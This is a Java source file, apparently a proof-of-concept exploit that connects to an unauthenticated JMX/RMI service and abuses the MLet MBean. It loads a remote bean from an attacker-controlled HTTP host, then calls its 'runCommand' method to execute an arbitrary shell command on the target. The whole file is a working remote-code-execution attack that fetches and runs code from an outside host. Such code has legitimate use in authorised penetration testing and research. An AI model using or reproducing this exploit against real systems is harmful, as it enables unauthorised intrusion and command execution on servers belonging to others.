import javax.management.remote.*;
import javax.management.*;
import java.util.*;
import java.lang.*;
import java.io.*;
import java.net.*;
import com.sun.net.httpserver.*;

public class RemoteMbean {
    private static String OBJECTNAME = "MLetCompromise:name=evil,id=2";

    public static void main(String[] args) {
        try {
            connectAndOwn(args[0], args[1], args[2], args[3]);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    static void connectAndOwn(String serverName, String port, String command, String localIP) {
        try {
            JMXServiceURL u = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + serverName + ":" + port +  "/jmxrmi");
            System.out.println("URL: "+u+", connecting");

            /*
            Map env = new HashMap();
            String[] creds = {"username", "password"};
            env.put(JMXConnector.CREDENTIALS, creds);

            JMXConnector c = JMXConnectorFactory.connect(u, env);
             */

            JMXConnector c = JMXConnectorFactory.connect(u);

            System.out.println("Connected: " + c.getConnectionId());

            MBeanServerConnection m = c.getMBeanServerConnection();

           /* XXX: add cleanup option
            for (ObjectInstance x : m.queryMBeans(null, null)) {
                System.out.println("Checking " + x.getObjectName().toString());
                if (x.getObjectName().toString().startsWith("DefaultDomain:type=MLet")
                    ||
                   (x.getObjectName().toString().startsWith("MLetCompromise"))
                    ){
                    System.out.println("Removing" + x.getObjectName().toString());
                    m.unregisterMBean(x.getObjectName());
                }
            }
            System.out.println("Exiting after cleanup");
            System.exit(0);
           */
            ObjectInstance evil_bean = null;
            try {
                evil_bean = m.getObjectInstance(new ObjectName(OBJECTNAME));
            } catch (Exception e) {
                evil_bean = null;
            }

            if (evil_bean == null) {
                System.out.println("Trying to create bean...");
                ObjectInstance evil = null;
                try {
                    evil = m.createMBean("javax.management.loading.MLet", null);
                } catch (javax.management.InstanceAlreadyExistsException e) {
                    System.out.println("DefaultDomain:type=MLet already exists");
                    evil = m.getObjectInstance(new ObjectName("DefaultDomain:type=MLet"));
                }
                System.out.println("Loaded "+evil.getClassName());

                System.out.println("Sending IP:"+localIP);
                Object res = m.invoke(evil.getObjectName(), "getMBeansFromURL",
                                      new Object[] { String.format("http://%s:80/woohoo.html", localIP) },
                                      new String[] { String.class.getName() }
                                      );
                HashSet res_set = ((HashSet)res);
                Iterator itr = res_set.iterator();
                Object nextObject = itr.next();
                System.out.println("nextObject = " + nextObject.toString());
                if (nextObject instanceof Exception) {
                    throw ((Exception)nextObject);
                }
                evil_bean  = ((ObjectInstance)nextObject);
            }
            System.out.println("Loaded class: "+evil_bean.getClassName()+" object "+evil_bean.getObjectName());
            System.out.println("Calling runCommand with: "+command);
            Object result = m.invoke(evil_bean.getObjectName(), "runCommand", new Object[]{ command }, new String[]{ String.class.getName() });
            System.out.println("Result: "+result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
